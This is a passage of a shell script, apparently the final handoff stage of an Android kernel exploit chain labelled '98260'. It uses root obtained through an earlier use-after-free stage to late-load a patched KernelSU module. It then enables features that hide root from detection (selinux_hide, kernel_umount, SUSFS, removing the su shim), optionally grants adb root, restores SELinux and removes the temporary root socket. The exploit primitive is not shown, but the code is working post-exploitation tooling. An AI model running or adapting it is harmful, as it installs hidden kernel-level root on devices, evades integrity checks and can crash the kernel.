                else
                    echo "98260_KSU_LATELOAD_PRIMARY_RC=init_cred_insmod_failed" | tee -a "$KSU_LOG"
                    _primary_ll_rc=1
                fi
                sleep 1
                if [ "$_primary_ll_rc" = "0" ] && grep -q '^kernelsu ' /proc/modules 2>/dev/null; then
                    KSU_METHOD=ksud-late-load-primary
                    echo "98260_KSU_LATELOAD_PRIMARY_OK=1"
                fi
            fi
            echo "98260_KSU_ALLOW_SHELL=$ALLOW_SHELL_98260"
            if [ -z "$KSU_METHOD" ]; then
                printf 'mkdir -p /data/adb/ksu/lib && cp %s /data/adb/ksu/lib/%s_kernelsu.ko && chmod 644 /data/adb/ksu/lib/%s_kernelsu.ko\n' \
                    "$PATCHED" "$KMI" "$KMI" | "$SU" >> "$KSU_LOG" 2>&1
                KSU_METHOD=ksud-late-load
                printf 'export LD_LIBRARY_PATH="%s"; "%s" late-load --kmi "%s" --package-name "%s"%s\n' \
                    "$D" "$KSUD" "$KMI" "$MGR" "$KSU_ALLOW_ARG" | "$SU" >> "$KSU_LOG" 2>&1
                sleep 1
                if ! grep -q '^kernelsu ' /proc/modules 2>/dev/null; then
                    KSU_METHOD=insmod-fallback
                    _ff_fallback=""
                    [ "$SU_COMPAT_98260" = "0" ] && _ff_fallback=" force_feature=su_compat:0"
                    printf 'insmod "%s"%s\n' "$PATCHED" "$_ff_fallback" | "$SU" >> "$KSU_LOG" 2>&1
                    sleep 1
                fi
            fi
            if ksu_loaded_98260; then
                finish_ksu_loaded "$KSU_METHOD" 0
            else
                echo "98260_KSU=failed method=$KSU_METHOD flavor=$KSU_FLAVOR_LOCAL log=$KSU_LOG"
            fi
        fi
    fi
else
    echo "98260_KSU=disabled"
fi

# late-load can return 0 before /system/bin/su exists; do not let su_entry
# race the node creation (timeout only execs once).
KSU_SU_READY=0
if [ "$KSU_ENABLE" = "1" ] && [ "${REAL_CRED_SU_PROVEN:-0}" = "1" ] &&
   [ -n "${KSU_SU_PROVIDER:-}" ]; then
    # Already proven seconds ago in this same run.  Re-probing for 60 s only
    # races the manager restart (2026-11-14 17:58: 75 s wasted, then rootd
    # kept although su had been usable moments earlier).
    KSU_SU_READY=1
    echo "98260_KSU_SU_WAIT=reuse provider=$KSU_SU_PROVIDER" | tee -a "$KSU_LOG"
elif [ "$KSU_ENABLE" = "1" ]; then
    # Single non-blocking pass.  The KSU module is already live; su readiness
    # only decides whether the rootd fallback can be removed, and must not
    # stall the run (2026-11-15 03:57: a 90 s loop left a successful FinaSU
    # run at 64%).  Cleanup below keeps rootd when this misses.
    for _sc in su /system/bin/su /data/adb/ksu/bin/su; do
        case "$_sc" in
            /*) [ -x "$_sc" ] || continue ;;
            *) command -v "$_sc" >/dev/null 2>&1 || continue ;;
        esac
        _su_id=$(timeout 1 "$_sc" -c 'id -u' 2>/dev/null | tr -d ' \r\n')
        if [ "$_su_id" = "0" ]; then
            KSU_SU_READY=1
            KSU_SU_PROVIDER=$_sc
            echo "98260_SU_PROVIDER_EARLY=$_sc"
            break
        fi
    done
    echo "98260_KSU_SU_WAIT=$KSU_SU_READY attempts=1"
fi

# The manager APK is deliberately not bundled.  Detect the selected manager
# so the UI can tell the user to install it; never auto-install a stale build.
_MGR_PKG=${MAGICROOT_KSU_PKG:-$(ksu_flavor_pkg "$KSU_FLAVOR_LOCAL" 2>/dev/null || true)}
if [ -n "${_MGR_PKG:-}" ]; then
    if pm path "$_MGR_PKG" >/dev/null 2>&1; then
        echo "98260_MANAGER_PRESENT=1 package=$_MGR_PKG"
    else
        echo "98260_MANAGER_PRESENT=0 package=$_MGR_PKG"
        echo "98260_MANAGER_HINT=install_selected_manager_from_apk_or_store"
    fi
fi

# Upstream-style manager userspace setup after handoff (best effort).  A live
# LKM is NOT a registered userspace: `98260_KSU=loaded` only proves the module
# is resident.  When the late-load userspace stage failed (or never ran because
# no su provider was usable), `ksud install` is what creates /data/adb/ksu and
# the su entry point.  Never gate this on .ksu_loaded.
if [ "$KSU_SU_READY" != "1" ] &&
   [ -n "${KSUD:-}" ] && [ -x "$KSUD" ]; then
    MGR_SETUP_LOG=$D/98260-manager.log
    : > "$MGR_SETUP_LOG" 2>/dev/null || true
    # libksud needs its bundled libadbroot for every install, not just the
    # preinstall.  The old post-install ran the bare binary and failed with
    # rc=1 after late-load, so the manager's su provider never appeared.
    _mgr_install_cmd="export LD_LIBRARY_PATH='$D'; '$KSUD' install --libadbroot '$D/libadbroot.so' --data-path /data/adb"
    MGR_INSTALL_RC=1
    _mgr_su=""
    # The rootd client is often the only usable root right after a late LKM
    # load, because KSU sucompat has no userspace target yet.  Probe every
    # provider instead of trusting a single one.
    for _ms in "$SU" /system/bin/su su /data/adb/ksu/bin/su; do
        [ -n "$_ms" ] || continue
        case "$_ms" in
            /*) [ -x "$_ms" ] || continue ;;
            *) command -v "$_ms" >/dev/null 2>&1 || continue ;;
        esac
        _ms_uid=$(timeout 5 "$_ms" -c 'id -u' 2>/dev/null | tr -d ' \r\n')
        [ "$_ms_uid" = "0" ] || continue
        _mgr_su="$_ms"
        break
    done
    if [ -n "$_mgr_su" ]; then
        echo "98260_KSUD_INSTALL_VIA=$_mgr_su" >> "$MGR_SETUP_LOG"
        # Bounded: a wedged ksud must not turn a successful root into a stuck
        # run (the whole chain is already usable at this point).
        timeout -k 2 30 "$_mgr_su" -c "$_mgr_install_cmd" >> "$MGR_SETUP_LOG" 2>&1
        MGR_INSTALL_RC=$?
        if [ "$MGR_INSTALL_RC" != "0" ]; then
            echo "98260_KSUD_INSTALL_VIA=$_mgr_su stdin-fallback" >> "$MGR_SETUP_LOG"
            printf '%s\n' "$_mgr_install_cmd" | timeout -k 2 30 "$_mgr_su" >> "$MGR_SETUP_LOG" 2>&1
            MGR_INSTALL_RC=$?
        fi
    else
        echo "98260_KSUD_INSTALL_VIA=none" >> "$MGR_SETUP_LOG"
    fi
    echo "98260_KSUD_INSTALL_RC=$MGR_INSTALL_RC"
    if [ "$MGR_INSTALL_RC" != "0" ]; then
        tail -20 "$MGR_SETUP_LOG" 2>/dev/null | sed 's/^/98260_KSUD_INSTALL_LOG=/' || true
    fi
    if [ "$MGR_INSTALL_RC" = "0" ]; then
        # install() creates the userspace tree; late-load registers the manager
        # package.  ksud skips reloading an already-live module by itself.
        if [ -n "$_mgr_su" ]; then
            _mgr_allow=""
            [ "$ALLOW_SHELL_98260" = "1" ] && _mgr_allow=" --allow-shell"
            printf 'export LD_LIBRARY_PATH="%s"; "%s" late-load --kmi "%s" --package-name "%s"%s\n' \
                "$D" "$KSUD" "$KMI" "$MGR" "$_mgr_allow" | timeout -k 2 30 "$_mgr_su" >> "$MGR_SETUP_LOG" 2>&1
            echo "98260_KSUD_LATELOAD_POST_RC=$?"
        fi
        # Fire-and-forget: probing the manager fd costs a su exec per second
        # and must not delay the run's final status.
        echo "98260_MANAGER_REFRESHED=async package=$MGR"
        am force-stop "$MGR" >/dev/null 2>&1 || true
        monkey -p "$MGR" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 || true
        # Registration may make su usable; refresh the readiness flag so
        # su_entry/cleanup decisions below see the real state.
        if [ "$KSU_SU_READY" != "1" ]; then
            for _sv in su /system/bin/su /data/adb/ksu/bin/su; do
                case "$_sv" in
                    /*) [ -x "$_sv" ] || continue ;;
                    *) command -v "$_sv" >/dev/null 2>&1 || continue ;;
                esac
                _sv_uid=$(timeout 1 "$_sv" -c 'id -u' 2>/dev/null | tr -d ' \r\n')
                [ "$_sv_uid" = "0" ] || continue
                KSU_SU_READY=1
                KSU_SU_PROVIDER=$_sv
                echo "98260_SU_PROVIDER_POST=$_sv"
                break
            done
        fi
    fi
fi

if [ "$KSU_SU_READY" = "1" ]; then
    : > "$D/.ksu_su_ready" 2>/dev/null || true
fi

# KernelSU-Next ships a ksud binary with embedded per-KMI SUSFS guard assets.
# Use that official "complete ksud + guard" path when the selected backend is
# Next.  This is separate from the experimental branch .ko fallback; failures
# are non-fatal and are reported in the log.
# The Next manager embedded guard is not the hardened OnePlus-vendored
# 6.12/6.6 build; only load it with explicit opt-in.
_SUSFS_ENABLED=${SUSFS_ENABLE:-${SUSFS_SWITCH:-0}}
if [ "$_SUSFS_ENABLED" = "1" ] && [ "$KSU_FLAVOR_LOCAL" = "next" ] &&
   [ "${MAGICROOT_SUSFS_NEXT_EMBEDDED:-1}" = "1" ] &&
   [ -n "${KSUD:-}" ] && [ -x "$KSUD" ] &&
   ! _susfs_loaded; then
    _susfs_ksud_log=$D/98260-susfs-ksud.log
    : > "$_susfs_ksud_log" 2>/dev/null || true
    echo "SUSFS_KSUD_EMBEDDED_LOAD_BEGIN kmi=$KMI path=$KSUD"
    _susfs_ksud_cmd="'$KSUD' susfs load --kmi '$KMI'"
    if [ -n "${KSU_SU_PROVIDER:-}" ] && [ -x "$KSU_SU_PROVIDER" ]; then
        "$KSU_SU_PROVIDER" -c "$_susfs_ksud_cmd" >> "$_susfs_ksud_log" 2>&1
        _susfs_ksud_rc=$?
    elif command -v su >/dev/null 2>&1; then
        su -c "$_susfs_ksud_cmd" >> "$_susfs_ksud_log" 2>&1
        _susfs_ksud_rc=$?
    elif [ -x /data/adb/ksu/bin/su ]; then
        /data/adb/ksu/bin/su -c "$_susfs_ksud_cmd" >> "$_susfs_ksud_log" 2>&1
        _susfs_ksud_rc=$?
    else
        "$SU" -c "$_susfs_ksud_cmd" >> "$_susfs_ksud_log" 2>&1
        _susfs_ksud_rc=$?
    fi
    echo "SUSFS_KSUD_EMBEDDED_LOAD_RC=$_susfs_ksud_rc"
    tail -n 12 "$_susfs_ksud_log" 2>/dev/null || true
    if _susfs_wait_loaded; then
        echo "SUSFS_KSUD_EMBEDDED_LOADED=1 rc=$_susfs_ksud_rc verify=module_or_proc"
    else
        echo "SUSFS_KSUD_EMBEDDED_LOADED=0 rc=$_susfs_ksud_rc reason=no_module_or_proc_after_wait"
    fi
fi

# If su_compat is disabled, remove the KSU /system/bin/su shim as early as
# possible (after manager userspace setup, before su_entry).  This reduces the
# STP check-su exposure window and makes su_entry exercise its /data/adb path.
if [ "$SU_COMPAT_98260" = "0" ] && [ "$SU_ENTRY_98260" != "1" ] && [ "$KSU_ENABLE" = "1" ] && grep -q '^kernelsu ' /proc/modules 2>/dev/null; then
    FEATURE_EARLY="${KSUD:-/data/adb/ksud}"
    [ -x "$FEATURE_EARLY" ] || FEATURE_EARLY=/data/adb/ksud
    if command -v su >/dev/null 2>&1; then
        su -c "$FEATURE_EARLY feature set su_compat 0" >>"$D/98260-features.log" 2>&1
    else
        "$SU" -c "$FEATURE_EARLY feature set su_compat 0" >>"$D/98260-features.log" 2>&1
    fi
    echo "98260_SU_COMPAT_EARLY=0 rc=$?"
fi

# Default su entry for the 98260 chain.  The 64560 root_stage executes
# su_entry.sh; the 98260 handoff previously ignored MAGICROOT_SU_ENTRY.
# Run it after KSU/manager setup, through the KSU su when available or through
# the still-live rootd client otherwise.  Non-fatal.
if [ "$SU_ENTRY_98260" = "1" ] && [ "$KSU_ENABLE" = "1" ] && [ "$KSU_SU_READY" = "1" ] && [ -f "$D/su_entry.sh" ]; then
    chmod 755 "$D/su_entry.sh" 2>/dev/null || true
    # Keep a WORK copy for su_entry even when MAGICROOT_SU points at a
    # nativeLibraryDir libexec payload.
    if [ ! -x "$D/pc98260-su" ] && [ -x "$SU" ]; then
        cp -f "$SU" "$D/pc98260-su" 2>/dev/null || true
        chmod 755 "$D/pc98260-su" 2>/dev/null || true
    fi
    SU_ENTRY_LOG=$D/98260-su-entry.log
    : > "$SU_ENTRY_LOG" 2>/dev/null || true
    if command -v su >/dev/null 2>&1; then
        su -c "sh $D/su_entry.sh '$SU'" >> "$SU_ENTRY_LOG" 2>&1
        SU_ENTRY_RC=$?
    else
        "$SU" -c "sh $D/su_entry.sh '$SU'" >> "$SU_ENTRY_LOG" 2>&1
        SU_ENTRY_RC=$?
    fi
    cat "$SU_ENTRY_LOG" 2>/dev/null || true
    echo "98260_SU_ENTRY_RC=$SU_ENTRY_RC"
    if grep -q '^SU_ENTRY=ok' "$SU_ENTRY_LOG" 2>/dev/null; then
        rm -f "$D/.keep-rootd" 2>/dev/null || true
    else
        # KSU manager may become unusable if the only rootd fallback is
        # unlinked while su entry failed.  Keep it until reboot.
        : > "$D/.keep-rootd" 2>/dev/null || true
        echo "98260_KEEP_ROOTD=su_entry_failed"
    fi
elif [ "$SU_ENTRY_98260" = "1" ] && { [ "$KSU_ENABLE" != "1" ] || [ "$KSU_SU_READY" != "1" ]; }; then
    echo "98260_SU_ENTRY=skipped reason=ksu_disabled_or_su_node_missing"
elif [ "$SU_ENTRY_98260" = "1" ]; then
    echo "98260_SU_ENTRY=skipped reason=missing_script"
else
    echo "98260_SU_ENTRY=disabled"
fi

# Rootd cleanup has already been deferred by finish_ksu_loaded; do it only
# after a real KSU su proof.  Feature switches may now safely disable su_compat
# without making the KSU_UID/cleanup proof fail.
if [ -f "$D/.ksu_loaded" ]; then
    if [ "$KSU_SU_READY" != "1" ]; then
        echo "98260_ROOTD_KEPT=1 reason=ksu_su_not_ready"
    elif [ "${MAGICROOT_KEEP_ROOTD:-0}" = "1" ] || [ -f "$D/.keep-rootd-user" ]; then
        echo "98260_KEEP_ROOTD=user reason=stp"
    else
        rm -f "$D/.keep-rootd" "$D/.ksu_su_ready" 2>/dev/null || true
        _rsu=${KSU_SU_PROVIDER:-}
        if [ "$REAL_CRED_NATIVE" = "1" ] && [ -S "$SOCK" ]; then
            if [ -n "$_rsu" ]; then
                timeout -k 1 5 "$_rsu" -c "__PC98260_SHUTDOWN__" >/dev/null 2>&1 || true
                echo "98260_REAL_CRED_HANDOFF=shutdown_requested"
            elif [ -x "$SU" ]; then
                timeout -k 1 5 "$SU" -c "__PC98260_SHUTDOWN__" >/dev/null 2>&1 || true
                echo "98260_REAL_CRED_HANDOFF=shutdown_requested"
            fi
        fi
        if [ -n "$_rsu" ]; then
            "$_rsu" -c "rm -f '$SOCK' /data/local/tmp/pc98260-root2.sock" >/dev/null 2>&1 || true
        else
            rm -f "$SOCK" /data/local/tmp/pc98260-root2.sock 2>/dev/null || true
        fi
        # The provider may have gone away with the manager restart; the shell
        # can still unlink the socket because /data/local/tmp is group-writable.
        if [ -S "$SOCK" ] || [ -e "$SOCK" ]; then
            rm -f "$SOCK" /data/local/tmp/pc98260-root2.sock 2>/dev/null || true
        fi
        rm -f /data/local/tmp/.magicroot-98260-parked 2>/dev/null || true
        if [ -S "$SOCK" ] || [ -e "$SOCK" ]; then
            echo "98260_CLEANUP=deferred reason=socket_remains path=$SOCK"
        else
            echo "98260_CLEANUP=ok reason=ksu_loaded"
        fi
    fi
else
    echo "98260_ROOTD_KEPT=1 reason=ksu_not_loaded"
fi

# Upstream-style cleanup: only after normal su works.  Never kill the plant
# merely because the module is loaded; a broken su would lose the fallback.
# KernelSU feature switches for the 98260 handoff.  These are the same
# ksud feature names used by the 64560 root_stage path.
if [ "$KSU_ENABLE" = "1" ] && [ "$KSU_SU_READY" = "1" ] && ksu_loaded_98260; then
    FEATURE_LOG=$D/98260-features.log
    : > "$FEATURE_LOG" 2>/dev/null || true
    FEATURE_KSUD="${KSUD:-/data/adb/ksud}"
    [ -x "$FEATURE_KSUD" ] || FEATURE_KSUD=/data/adb/ksud
    feature_set_98260() {
        _f_name="$1"
        _f_value="$2"
        if command -v su >/dev/null 2>&1; then
            su -c "$FEATURE_KSUD feature set $_f_name $_f_value" >> "$FEATURE_LOG" 2>&1
        else
            "$SU" -c "$FEATURE_KSUD feature set $_f_name $_f_value" >> "$FEATURE_LOG" 2>&1
        fi
        _f_rc=$?
        echo "98260_FEATURE_${_f_name}=${_f_value} rc=${_f_rc}"
    }
    feature_set_98260 kernel_umount "$KERNEL_UMOUNT_98260"
    feature_set_98260 selinux_hide "$SELINUX_HIDE_98260"
    feature_set_98260 adb_root "$ADB_ROOT_98260"
    feature_set_98260 su_compat "$SU_COMPAT_98260"
    if [ "$ADB_ROOT_98260" = "1" ]; then
        if command -v su >/dev/null 2>&1; then
            su -c "setprop ctl.restart adbd" >> "$FEATURE_LOG" 2>&1 || true
        else
            printf 'setprop ctl.restart adbd\n' | "$SU" >> "$FEATURE_LOG" 2>&1 || true
        fi
        echo "98260_ADB_ROOT=1 adbd_restart=requested"
    else
        echo "98260_ADB_ROOT=0"
    fi
fi

# Manager "soft reboot" policy.  FinaSU and the other flavors need
# ksud soft-reboot to run the module post-fs-data/services pass after a
# late-load, so the lock is opt-in: set MAGICROOT_SOFT_REBOOT_GUARD=1 to arm
# it.  ksud takes an exclusive flock on this path *before* stop; a directory
# makes that open/flock fail early, so the manager aborts safely instead of
# reaching stop/start.  On this late-load KSU that stop/start can be turned
# into a cold reboot by the Honor watchdog, and an unproven timer-UAF victim
# can panic the kernel; the default therefore allows soft reboot at the
# user's own risk, and a full reboot remains the safer recovery.
SOFT_REBOOT_GUARD_DEFAULT=${MAGICROOT_SOFT_REBOOT_GUARD:-0}
case "$SOFT_REBOOT_GUARD_DEFAULT" in
    ''|*[!01]*) SOFT_REBOOT_GUARD_DEFAULT=0 ;;
esac
if [ "$SOFT_REBOOT_GUARD_DEFAULT" = "1" ]; then
    _sg_su=${KSU_SU_PROVIDER:-}
    if [ -z "$_sg_su" ] && command -v su >/dev/null 2>&1; then
        _sg_su="su"
    elif [ -z "$_sg_su" ] && [ -x /system/bin/su ]; then
        _sg_su=/system/bin/su
    elif [ -z "$_sg_su" ] && [ -x /data/adb/ksu/bin/su ]; then
        _sg_su=/data/adb/ksu/bin/su
    fi
    if [ -n "$_sg_su" ]; then
        "$_sg_su" -c 'rm -rf /data/adb/ksu/soft_reboot.lock; mkdir -p /data/adb/ksu/soft_reboot.lock; chmod 700 /data/adb/ksu/soft_reboot.lock' >/dev/null 2>&1
        # /data/adb is not necessarily searchable by the outer uid-2000 shell.
        # Verify through the same root provider that created the guard.
        if "$_sg_su" -c 'test -d /data/adb/ksu/soft_reboot.lock' >/dev/null 2>&1; then
            echo "SOFT_REBOOT_GUARD=armed path=/data/adb/ksu/soft_reboot.lock mode=lock_dir verified=root"
        else
            echo "SOFT_REBOOT_GUARD=arm_failed verified=root"
        fi
    else
        echo "SOFT_REBOOT_GUARD=skip reason=no_su_provider"
    fi
else
    # Guard is off by default.  Remove the directory form left by older
    # builds; otherwise FinaSU's ksud soft-reboot always fails before
    # stop/start and Zygisk modules never get their post-fs-data/services pass.
    _sg_su=${KSU_SU_PROVIDER:-}
    if [ -z "$_sg_su" ] && command -v su >/dev/null 2>&1; then
        _sg_su="su"
    elif [ -z "$_sg_su" ] && [ -x /system/bin/su ]; then
        _sg_su=/system/bin/su
    elif [ -z "$_sg_su" ] && [ -x /data/adb/ksu/bin/su ]; then
        _sg_su=/data/adb/ksu/bin/su
    fi
    if [ -n "$_sg_su" ] && "$_sg_su" -c 'test -d /data/adb/ksu/soft_reboot.lock' >/dev/null 2>&1; then
        "$_sg_su" -c 'rm -rf /data/adb/ksu/soft_reboot.lock' >/dev/null 2>&1
        if "$_sg_su" -c 'test -d /data/adb/ksu/soft_reboot.lock' >/dev/null 2>&1; then
            echo "SOFT_REBOOT_GUARD=disabled cleanup_failed path=/data/adb/ksu/soft_reboot.lock"
        else
            echo "SOFT_REBOOT_GUARD=disabled cleaned_old_lock_dir"
        fi
    else
        echo "SOFT_REBOOT_GUARD=disabled"
    fi
fi

UNPROVEN_COUNT=0
if [ -f /data/local/tmp/.magicroot-unproven ]; then
    _unp_boot=$(awk '{print $1}' /data/local/tmp/.magicroot-unproven 2>/dev/null)
    UNPROVEN_COUNT=$(awk '{print $2}' /data/local/tmp/.magicroot-unproven 2>/dev/null)
    case "$UNPROVEN_COUNT" in ''|*[!0-9]*) UNPROVEN_COUNT=1 ;; esac
    # A marker from an earlier boot describes pages that no longer exist.
    # Reporting it as armed victims makes the app claim a risk that is not
    # there (observed 2026-11-14 00:15: native summary unproven=0, wrapper
    # said unproven=1 from the 00:06 boot's file).
    if [ "$_unp_boot" != "$BOOT_ID" ]; then
        echo "98260_UNPROVEN_MARKER=stale boot=${_unp_boot:-unknown} current=$BOOT_ID"
        rm -f /data/local/tmp/.magicroot-unproven 2>/dev/null || true
        UNPROVEN_COUNT=0
    fi
fi
if [ "$UNPROVEN_COUNT" -gt 0 ] 2>/dev/null; then
    echo "98260_SOFT_REBOOT_SAFE=0 unproven=$UNPROVEN_COUNT reason=armed_victims"
    if [ "$SOFT_REBOOT_GUARD_DEFAULT" = "1" ]; then
        echo "HINT=manager soft-reboot is locked by MAGICROOT_SOFT_REBOOT_GUARD=1; unproven victims can panic the kernel"
    else
        echo "HINT=manager soft-reboot is allowed; unproven victims can panic/hard-reset the device; a full reboot is safer"
    fi
else
    echo "98260_SOFT_REBOOT_SAFE=guard_only unproven=0 note=no_unproven_victims"
fi

# Do not leave the device Permissive if KSU did not load (the last run did:
# missing=15 => Permissive shell with no su).  Restore Enforcing through the
# still-live rootd before reporting chain completion.
if [ "$KSU_ENABLE" = "1" ] && ! grep -q '^kernelsu ' /proc/modules 2>/dev/null; then
    _enforce_after=""
    if [ -x "$SU" ]; then
        _enforce_after=$("$SU" -c 'setenforce 1 2>/dev/null; getenforce' 2>/dev/null | tail -1)
    else
        setenforce 1 2>/dev/null || true
        _enforce_after=$(getenforce 2>/dev/null)
    fi
    case "$_enforce_after" in
        Enforcing) echo "98260_SELINUX_RESTORED=1 reason=ksu_failed" ;;
        *) echo "98260_SELINUX_RESTORE_FAIL=1 current=${_enforce_after:-unknown} reason=ksu_failed; reboot required" ;;
    esac
fi

# KSU late-load restores Enforcing, but a reused already-loaded KSU skips
# late-load, leaving the Permissive byte written by the UAF stage.  Restore it
# explicitly so a reused boot does not run the whole session Permissive.
if [ "$KSU_ENABLE" = "1" ] && [ "$(getenforce 2>/dev/null)" = "Permissive" ]; then
    _final_enforce=""
    if command -v su >/dev/null 2>&1; then
        _final_enforce=$(su -c 'setenforce 1 2>/dev/null; getenforce' 2>/dev/null | tail -1)
    elif [ -x "$SU" ]; then
        _final_enforce=$("$SU" -c 'setenforce 1 2>/dev/null; getenforce' 2>/dev/null | tail -1)
    fi
    echo "98260_SELINUX_FINAL=${_final_enforce:-unknown} reason=reused_ksu"
fi

if [ -s "$LOG" ] && grep -q '\[victim\]' "$LOG" 2>/dev/null; then
    grep '\[victim\]' "$LOG" | sed 's/^/98260_VICTIM /'
fi
# KSU was explicitly requested: a rootd-only result must not be reported as a
# complete success.  This catches patch_inputs_missing (empty slide), a skipped
# handoff, and any late module-load failure.
if [ "$KSU_ENABLE" = "1" ] && ! ksu_loaded_98260; then
    echo "98260_KSU=failed reason=not_loaded"
    echo "HINT=KernelSU was requested but is not live; reboot before retrying"
    echo "98260_CHAIN_END=ROOT_OK_KSU_FAIL code=82"
    exit 82
fi
echo "98260_SUCCESS=1 reused=${KSU_REUSED_98260:-0}"
echo "98260_EXEC_PID=$EXEC_PID"
echo "98260_ROOTD_SOCK=$SOCK"
echo "98260_SU=$SU"
echo "98260_CHAIN_END=OK"

exit 0
